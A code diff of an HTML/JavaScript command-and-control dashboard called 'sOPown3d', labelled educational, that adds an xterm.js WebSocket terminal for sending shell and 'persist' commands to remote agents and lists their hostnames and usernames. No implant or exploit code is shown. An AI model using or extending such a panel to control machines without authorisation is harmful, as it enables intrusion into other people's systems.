@@ -2,13 +2,11 @@
 <html>
 <head>
     <title>sOPown3d C2 Dashboard</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+    <!-- xterm.js CSS + Theme Dark -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@xterm/xterm@5.5.0/css/xterm.css"/>
 
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', 'SF Pro Display', -apple-system, sans-serif;
             background: #0a0a0a;
@@ -16,12 +14,7 @@
             padding: 20px;
             line-height: 1.6;
         }
-
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
+        .container { max-width: 1400px; margin: 0 auto; }
         header {
             background: linear-gradient(135deg, #1e3a8a 0%, #7c3aed 100%);
             padding: 30px;
@@ -29,18 +22,8 @@
             margin-bottom: 25px;
             box-shadow: 0 4px 20px rgba(124, 58, 237, 0.3);
         }
-
-        h1 {
-            color: white;
-            font-size: 2em;
-            margin-bottom: 10px;
-        }
-
-        .subtitle {
-            color: #c7d2fe;
-            font-size: 0.9em;
-        }
-
+        h1 { color: white; font-size: 2em; margin-bottom: 10px; }
+        .subtitle { color: #c7d2fe; font-size: 0.9em; }
         .db-status {
             float: right;
             padding: 8px 15px;
@@ -48,24 +31,14 @@
             font-size: 0.85em;
             font-weight: 600;
         }
-
-        .db-status.connected {
-            background: #10b981;
-            color: white;
-        }
-
-        .db-status.in-memory {
-            background: #f59e0b;
-            color: white;
-        }
-
+        .db-status.connected { background: #10b981; color: white; }
+        .db-status.in-memory { background: #f59e0b; color: white; }
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 15px;
             margin-bottom: 25px;
         }
-
         .stat-card {
             background: #1a1a1a;
             padding: 20px;
@@ -73,21 +46,8 @@
             border: 1px solid #2a2a2a;
             text-align: center;
         }
-
-        .stat-value {
-            font-size: 2.5em;
-            font-weight: bold;
-            color: #7c3aed;
-            margin: 10px 0;
-        }
-
-        .stat-label {
-            color: #9ca3af;
-            font-size: 0.9em;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
+        .stat-value { font-size: 2.5em; font-weight: bold; color: #7c3aed; margin: 10px 0; }
+        .stat-label { color: #9ca3af; font-size: 0.9em; text-transform: uppercase; letter-spacing: 1px; }
         .section {
             background: #1a1a1a;
             border-radius: 10px;
@@ -95,7 +55,6 @@
             margin-bottom: 25px;
             border: 1px solid #2a2a2a;
         }
-
         .section-header {
             display: flex;
             justify-content: space-between;
@@ -104,22 +63,9 @@
             padding-bottom: 15px;
             border-bottom: 2px solid #2a2a2a;
         }
-
-        .section-title {
-            font-size: 1.3em;
-            color: #f3f4f6;
-        }
-
-        .auto-refresh {
-            color: #9ca3af;
-            font-size: 0.85em;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-
+        .section-title { font-size: 1.3em; color: #f3f4f6; }
+        .auto-refresh { color: #9ca3af; font-size: 0.85em; }
+        table { width: 100%; border-collapse: collapse; }
         th {
             background: #262626;
             color: #9ca3af;
@@ -130,16 +76,8 @@
             font-size: 0.75em;
             letter-spacing: 1px;
         }
-
-        td {
-            padding: 12px;
-            border-bottom: 1px solid #2a2a2a;
-        }
-
-        tr:hover {
-            background: #262626;
-        }
-
+        td { padding: 12px; border-bottom: 1px solid #2a2a2a; }
+        tr:hover { background: #262626; }
         .status-badge {
             display: inline-block;
             padding: 4px 12px;
@@ -147,24 +85,14 @@
             font-size: 0.8em;
             font-weight: 600;
         }
-
-        .status-active {
-            background: #10b981;
-            color: white;
-        }
-
-        .status-inactive {
-            background: #ef4444;
-            color: white;
-        }
-
+        .status-active { background: #10b981; color: white; }
+        .status-inactive { background: #ef4444; color: white; }
         .command-panel {
             background: #262626;
             padding: 20px;
             border-radius: 8px;
             margin-top: 15px;
         }
-
         label {
             display: block;
             color: #9ca3af;
@@ -172,7 +100,6 @@
             font-size: 0.9em;
             font-weight: 500;
         }
-
         select, input {
             width: 100%;
             padding: 12px;
@@ -183,12 +110,7 @@
             font-size: 1em;
             margin-bottom: 15px;
         }
-
-        select:focus, input:focus {
-            outline: none;
-            border-color: #7c3aed;
-        }
-
+        select:focus, input:focus { outline: none; border-color: #7c3aed; }
         button {
             padding: 12px 24px;
             background: linear-gradient(135deg, #7c3aed 0%, #5b21b6 100%);
@@ -200,43 +122,43 @@
             font-size: 1em;
             transition: all 0.3s;
         }
-
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(124, 58, 237, 0.4);
-        }
-
-        .response {
-            background: #0a0a0a;
+        button:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(124, 58, 237, 0.4); }
+        button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .terminal-container {
+            background: #000;
+            border-radius: 8px;
             padding: 15px;
-            border-radius: 6px;
             margin-top: 15px;
-            font-family: 'Monaco', 'Courier New', monospace;
-            white-space: pre-wrap;
-            border: 1px solid #2a2a2a;
-            max-height: 300px;
-            overflow-y: auto;
+            border: 2px solid #333;
+            height: 500px;
+            position: relative;
         }
-
-        .no-data {
-            text-align: center;
-            color: #6b7280;
-            padding: 40px;
-            font-style: italic;
-        }
-
-        .time-ago {
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
             color: #9ca3af;
-            font-size: 0.85em;
+            font-size: 0.9em;
         }
-
+        .terminal-status {
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 0.8em;
+        }
+        .terminal-connected { background: #10b981; color: white; }
+        .terminal-disconnected { background: #ef4444; color: white; }
+        #terminal { height: calc(100% - 30px); width: 100%; }
+        .no-data { text-align: center; color: #6b7280; padding: 40px; font-style: italic; }
+        .time-ago { color: #9ca3af; font-size: 0.85em; }
         .output-preview {
             max-width: 300px;
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
             color: #9ca3af;
-            font-family: 'Monaco', monospace;
+            font-family: Monaco, monospace;
             font-size: 0.85em;
         }
     </style>
@@ -244,9 +166,9 @@
 <body>
 <div class="container">
     <header>
-        <div class="db-status" id="dbStatus">🔌 Loading...</div>
-        <h1>⚡ sOPown3d - C2 Dashboard</h1>
-        <div class="subtitle">Command & Control Management Panel - Educational Use Only</div>
+        <div class="db-status" id="dbStatus">Loading...</div>
+        <h1>&#128293; sOPown3d - C2 Dashboard</h1>
+        <div class="subtitle">Command &amp; Control Management Panel - Educational Use Only</div>
     </header>
 
     <!-- Statistics Panel -->
@@ -272,36 +194,36 @@
     <!-- Active Agents Table -->
     <div class="section">
         <div class="section-header">
-            <div class="section-title">🖥️ Active Agents</div>
+            <div class="section-title">&#128421;&#65039; Active Agents</div>
             <div class="auto-refresh" id="lastRefresh">Auto-refresh: 10s</div>
         </div>
         <table id="agentsTable">
             <thead>
-                <tr>
-                    <th>Hostname</th>
-                    <th>OS</th>
-                    <th>Username</th>
-                    <th>Last Seen</th>
-                    <th>Status</th>
-                </tr>
+            <tr>
+                <th>Hostname</th>
+                <th>OS</th>
+                <th>Username</th>
+                <th>Last Seen</th>
+                <th>Status</th>
+            </tr>
             </thead>
             <tbody id="agentsTableBody">
-                <tr><td colspan="5" class="no-data">Loading agents...</td></tr>
+            <tr><td colspan="5" class="no-data">Loading agents...</td></tr>
             </tbody>
         </table>
     </div>
 
-    <!-- Command Panel -->
+    <!-- Command Panel & Terminal -->
     <div class="section">
         <div class="section-header">
-            <div class="section-title">📡 Send Command</div>
+            <div class="section-title">&#128225; Interactive Terminal</div>
+            <div></div>
         </div>
         <div class="command-panel">
             <label>Agent ID:</label>
             <select id="agentSelect">
                 <option value="">Select an agent...</option>
             </select>
-
             <label>Command Type:</label>
             <select id="commandSelect" onchange="updatePayload()">
                 <option value="shell">shell</option>
@@ -309,216 +231,305 @@
                 <option value="ping">ping</option>
                 <option value="persist">persist</option>
             </select>
+            <button id="sendBtn" onclick="sendCommand()" disabled>&#128640; Send Command</button>
+        </div>
 
-            <label>Payload:</label>
-            <input type="text" id="payload" placeholder="Command to execute" value="whoami">
-
-            <button onclick="sendCommand()">🚀 Send Command</button>
-
-            <div class="response" id="response">Waiting for command...</div>
+        <!-- Terminal xterm.js -->
+        <div class="terminal-container">
+            <div class="terminal-header">
+                <span>Live Output: <span id="currentAgent">No agent</span></span>
+                <span id="terminalStatus" class="terminal-status terminal-disconnected">Disconnected</span>
+            </div>
+            <div id="terminal"></div>
         </div>
     </div>
 
     <!-- Recent Executions -->
     <div class="section">
         <div class="section-header">
-            <div class="section-title">📜 Recent Command Executions</div>
+            <div class="section-title">Recent Command Executions</div>
         </div>
         <table>
             <thead>
-                <tr>
-                    <th>Time</th>
-                    <th>Agent</th>
-                    <th>Action</th>
-                    <th>Payload</th>
-                    <th>Output Preview</th>
-                </tr>
+            <tr>
+                <th>Time</th>
+                <th>Agent</th>
+                <th>Action</th>
+                <th>Payload</th>
+                <th>Output Preview</th>
+            </tr>
             </thead>
             <tbody id="executionsTableBody">
-                <tr><td colspan="5" class="no-data">Loading executions...</td></tr>
+            <tr><td colspan="5" class="no-data">Loading executions...</td></tr>
             </tbody>
         </table>
     </div>
 </div>
 
+<!-- xterm.js + Addons -->
+<script src="https://cdn.jsdelivr.net/npm/@xterm/xterm@5.5.0/lib/xterm.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@xterm/addon-fit@0.10.0/lib/addon-fit.js"></script>
+
 <script>
-let autoRefreshInterval;
+    let autoRefreshInterval;
+    let term;
+    let ws;
+    let fitAddon;
 
-// Initialize dashboard
-document.addEventListener('DOMContentLoaded', function() {
-    refreshDashboard();
-    autoRefreshInterval = setInterval(refreshDashboard, 10000); // Refresh every 10 seconds
-});
+    // Initialize dashboard
+    const userInput = '\x1b[36msOPown3d\x1b[0m $ ';
 
-async function refreshDashboard() {
-    await Promise.all([
-        loadStats(),
-        loadAgents(),
-        loadExecutions()
-    ]);
-
-    const now = new Date().toLocaleTimeString();
-    document.getElementById('lastRefresh').textContent = `Last refresh: ${now}`;
-}
-
-async function loadStats() {
-    try {
-        const response = await fetch('/api/stats');
-        const stats = await response.json();
-
-        document.getElementById('totalAgents').textContent = stats.total_agents || 0;
-        document.getElementById('activeAgents').textContent = stats.active_agents || 0;
-        document.getElementById('totalExecutions').textContent = stats.total_executions || 0;
-        document.getElementById('lastHour').textContent = stats.executions_last_hour || 0;
-
-        const dbStatus = document.getElementById('dbStatus');
-        if (stats.db_status === 'connected') {
-            dbStatus.textContent = '🟢 Connected';
-            dbStatus.className = 'db-status connected';
-        } else {
-            dbStatus.textContent = '🟡 In-Memory';
-            dbStatus.className = 'db-status in-memory';
-        }
-    } catch (error) {
-        console.error('Failed to load stats:', error);
-    }
-}
-
-async function loadAgents() {
-    try {
-        const response = await fetch('/api/agents');
-        const data = await response.json();
-        const agents = data.agents || [];
-
-        const tbody = document.getElementById('agentsTableBody');
-        const agentSelect = document.getElementById('agentSelect');
-
-        const selectedAgentId = agentSelect.value;
-
-        if (agents.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="5" class="no-data">No agents connected yet</td></tr>';
-            agentSelect.innerHTML = '<option value="">No agents available</option>';
-            return;
-        }
-
-        tbody.innerHTML = agents.map(agent => `
-            <tr>
-                <td>${agent.hostname}</td>
-                <td>${agent.os}</td>
-                <td>${agent.username || 'N/A'}</td>
-                <td class="time-ago">${formatTimeAgo(agent.last_seen)}</td>
-                <td>
-                    <span class="status-badge ${agent.is_active ? 'status-active' : 'status-inactive'}">
-                        ${agent.is_active ? '🟢 Active' : '🔴 Inactive'}
-                    </span>
-                </td>
-            </tr>
-        `).join('');
-
-        agentSelect.innerHTML = '<option value="">Select an agent...</option>' +
-            agents.map(agent => `<option value="${agent.agent_id}">${agent.hostname} (${agent.os})</option>`).join('');
-
-        if (selectedAgentId && agents.some(agent => agent.agent_id === selectedAgentId)) {
-            agentSelect.value = selectedAgentId;
-        }
-
-    } catch (error) {
-        console.error('Failed to load agents:', error);
-    }
-}
-
-
-async function loadExecutions() {
-    try {
-        const response = await fetch('/api/executions?limit=20');
-        const data = await response.json();
-        const executions = data.executions || [];
-
-        const tbody = document.getElementById('executionsTableBody');
-
-        if (executions.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="5" class="no-data">No executions yet</td></tr>';
-            return;
-        }
-
-        tbody.innerHTML = executions.map(exec => `
-            <tr>
-                <td class="time-ago">${formatTime(exec.executed_at)}</td>
-                <td>${exec.agent_id}</td>
-                <td>${exec.command_action}</td>
-                <td><code>${exec.command_payload || '-'}</code></td>
-                <td class="output-preview">${exec.output || '(no output)'}</td>
-            </tr>
-        `).join('');
-
-    } catch (error) {
-        console.error('Failed to load executions:', error);
-    }
-}
-
-function formatTimeAgo(timestamp) {
-    const date = new Date(timestamp);
-    const now = new Date();
-    const seconds = Math.floor((now - date) / 1000);
-
-    if (seconds < 60) return `${seconds}s ago`;
-    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
-    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
-    return `${Math.floor(seconds / 86400)}d ago`;
-}
-
-function formatTime(timestamp) {
-    const date = new Date(timestamp);
-    return date.toLocaleTimeString();
-}
-
-function updatePayload() {
-    const cmd = document.getElementById('commandSelect').value;
-    const payloadInput = document.getElementById('payload');
-
-    if (cmd === 'shell') {
-        payloadInput.value = 'whoami';
-        payloadInput.disabled = false;
-    } else {
-        payloadInput.value = '';
-        payloadInput.disabled = true;
-    }
-}
-
-async function sendCommand() {
-    const agentId = document.getElementById('agentSelect').value;
-    const action = document.getElementById('commandSelect').value;
-    const payload = document.getElementById('payload').value;
-    const responseDiv = document.getElementById('response');
-
-    if (!agentId) {
-        alert('Please select an agent');
-        return;
-    }
-
-    responseDiv.textContent = 'Sending command...';
-
-    try {
-        const response = await fetch('/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                id: agentId,
-                action: action,
-                payload: payload
-            })
+    document.addEventListener('DOMContentLoaded', function() {
+        // Init xterm.js
+        term = new Terminal({
+            cursorBlink: true,
+            theme: {
+                background: '#000000',
+                foreground: '#ffffff',
+                cursor: '#7c3aed'
+            },
+            fontSize: 14,
+            fontFamily: 'Monaco, "Courier New", monospace',
+            rows: 20
         });
 
-        const result = await response.json();
-        responseDiv.textContent = `✅ Command sent successfully!\n\nAgent: ${agentId}\nAction: ${action}\nPayload: ${payload}\n\nThe agent will execute this command on its next beacon.`;
+        fitAddon = new FitAddon.FitAddon();
+        term.loadAddon(fitAddon);
+        term.open(document.getElementById('terminal'));
 
-        // Refresh agents table after a moment
-        setTimeout(refreshDashboard, 1000);
+        let inputBuffer = '';
 
-    } catch (error) {
-        responseDiv.textContent = `❌ Error: ${error.message}`;
+        term.onData((data) => {
+            if (data === '\r') { // Enter
+                const command = inputBuffer.trim();
+                if (command) {
+                    term.writeln('');
+                    sendCommand(command);
+                }
+                else if (command === '') {
+                    term.writeln('')
+                    inputBuffer = '';
+                    term.write(userInput)
+                }
+                term.write('')
+                inputBuffer = '';
+                return;
+            }
+
+            if (data === '\x7f') { // backspace
+                if (inputBuffer.length > 0) {
+                    inputBuffer = inputBuffer.slice(0, -1);
+                    term.write('\b \b'); // Efface visuellement mais l'input reste ?
+                }
+                return;
+            }
+
+            inputBuffer += data;
+            term.write(data);
+        });
+
+        fitAddon.fit();
+        term.writeln('sOPown3d Terminal');
+        term.writeln('─'.repeat(60));
+        term.writeln('Select an agent to begin...');
+
+        refreshDashboard();
+        autoRefreshInterval = setInterval(refreshDashboard, 10000);
+
+        // Resize terminal on window resize
+        window.addEventListener('resize', () => fitAddon.fit());
+    });
+
+    function connectTerminal(agentId) {
+        if (!agentId) {
+            document.getElementById('terminalStatus').textContent = 'Disconnected';
+            document.getElementById('terminalStatus').className = 'terminal-status terminal-disconnected';
+            document.getElementById('currentAgent').textContent = 'No agent';
+            return;
+        }
+        if (ws) { ws.close(); }
+        ws = new WebSocket(`ws://localhost:8080/websocket?agent=${agentId}`);
+        ws.onopen = () => {
+            document.getElementById('terminalStatus').textContent = 'Connected';
+            document.getElementById('terminalStatus').className = 'terminal-status terminal-connected';
+            document.getElementById('currentAgent').textContent = agentId;
+        };
+        ws.onmessage = (event) => {
+            let output = event.data;
+            output = output
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/[^\x00-\x7F]*/g, '');
+            term.writeln(output);
+            term.write(userInput);
+        };
+        ws.onclose = () => {
+            term.writeln('');
+            term.writeln('\x1b[31m[Connection closed]\x1b[0m');
+            document.getElementById('terminalStatus').textContent = 'Disconnected';
+            document.getElementById('terminalStatus').className = 'terminal-status terminal-disconnected';
+        };
+        ws.onerror = (error) => {
+            term.writeln('');
+            term.writeln('\x1b[31m[WebSocket error]\x1b[0m');
+            console.error('WS error', error);
+        };
     }
-}
+
+    async function refreshDashboard() {
+        await Promise.all([loadStats(), loadAgents(), loadExecutions()]);
+        const now = new Date().toLocaleTimeString();
+        document.getElementById('lastRefresh').textContent = `Last refresh: ${now}`;
+    }
+
+    async function loadStats() {
+        try {
+            const response = await fetch('/api/stats');
+            const stats = await response.json();
+            document.getElementById('totalAgents').textContent = stats.total_agents || 0;
+            document.getElementById('activeAgents').textContent = stats.active_agents || 0;
+            document.getElementById('totalExecutions').textContent = stats.total_executions || 0;
+            document.getElementById('lastHour').textContent = stats.executions_last_hour || 0;
+            const dbStatus = document.getElementById('dbStatus');
+            if (stats.db_status === 'connected') {
+                dbStatus.textContent = 'Connected';
+                dbStatus.className = 'db-status connected';
+            } else {
+                dbStatus.textContent = 'In-Memory';
+                dbStatus.className = 'db-status in-memory';
+            }
+        } catch (error) {
+            console.error('Failed to load stats', error);
+        }
+    }
+
+    async function loadAgents() {
+        try {
+            const previouslySelected = document.getElementById('agentSelect').value;
+            const response = await fetch('/api/agents');
+            const data = await response.json();
+            const agents = data.agents;
+            const tbody = document.getElementById('agentsTableBody');
+            const agentSelect = document.getElementById('agentSelect');
+
+            if (agents.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" class="no-data">No agents connected yet</td></tr>';
+                agentSelect.innerHTML = '<option value="">No agents available</option>';
+                document.getElementById('sendBtn').disabled = true;
+                return;
+            }
+
+            tbody.innerHTML = agents.map(agent => `
+        <tr>
+          <td>${agent.hostname}</td>
+          <td>${agent.os}</td>
+          <td>${agent.username || 'N/A'}</td>
+          <td class="time-ago">${formatTimeAgo(agent.last_seen)}</td>
+          <td>
+            <span class="status-badge ${agent.is_active ? 'status-active' : 'status-inactive'}">
+              ${agent.is_active ? 'Active' : 'Inactive'}
+            </span>
+          </td>
+        </tr>
+      `).join('');
+
+            agentSelect.innerHTML = '<option value="">Select an agent...</option>' +
+                agents.map(agent => `<option value="${agent.agent_id}">${agent.hostname} (${agent.os})</option>`).join('');
+
+            if (previouslySelected && agents.some(agent => agent.agent_id === previouslySelected)) {
+                agentSelect.value = previouslySelected;
+                document.getElementById('sendBtn').disabled = false;
+            }
+        } catch (error) {
+            console.error('Failed to load agents', error);
+        }
+    }
+
+    async function loadExecutions() {
+        try {
+            const response = await fetch('/api/executions?limit=20');
+            const data = await response.json();
+            const executions = data.executions;
+            const tbody = document.getElementById('executionsTableBody');
+
+            if (executions.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" class="no-data">No executions yet</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = executions.map(exec => `
+        <tr>
+          <td class="time-ago">${formatTime(exec.executed_at)}</td>
+          <td>${exec.agent_id}</td>
+          <td>${exec.command.action}</td>
+          <td><code>${exec.command.payload || '-'}</code></td>
+          <td class="output-preview">${exec.output || 'no output'}</td>
+        </tr>
+      `).join('');
+        } catch (error) {
+            console.error('Failed to load executions', error);
+        }
+    }
+
+    function formatTimeAgo(timestamp) {
+        const date = new Date(timestamp);
+        const now = new Date();
+        const seconds = Math.floor((now - date) / 1000);
+        if (seconds < 60) return `${seconds}s ago`;
+        if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
+        if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
+        return `${Math.floor(seconds / 86400)}d ago`;
+    }
+
+    function formatTime(timestamp) {
+        const date = new Date(timestamp);
+        return date.toLocaleTimeString();
+    }
+
+    // Agent selection change handler
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('agentSelect').addEventListener('change', function() {
+            const agentId = this.value;
+            const sendBtn = document.getElementById('sendBtn');
+            if (agentId) {
+                connectTerminal(agentId);
+                sendBtn.disabled = false;
+            } else {
+                connectTerminal(null);
+                sendBtn.disabled = true;
+            }
+        });
+    });
+
+    async function sendCommand(cmd = null) {
+        const agentId = document.getElementById('agentSelect').value;
+        const action = document.getElementById('commandSelect').value;
+        // Si la commande vient du terminal, c'est forcément un shell
+        const payload = cmd || action;
+        const finalAction = cmd ? 'shell' : action;
+
+        if (!agentId) {
+            alert('Please select an agent');
+            return;
+        }
+
+        term.writeln('');
+
+        try {
+            const response = await fetch('/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: agentId, action: finalAction, payload: payload })
+            });
+            const result = await response.json();
+            if (!response.ok) {
+                term.writeln(`\x1b[31m[Error] ${response.statusText}\x1b[0m`);
+            }
+            setTimeout(refreshDashboard, 1000);
+        } catch (error) {
+            term.writeln(`\x1b[31m[Network error] ${error.message}\x1b[0m`);
+        }
+    }
 </script>
 </body>
 </html>
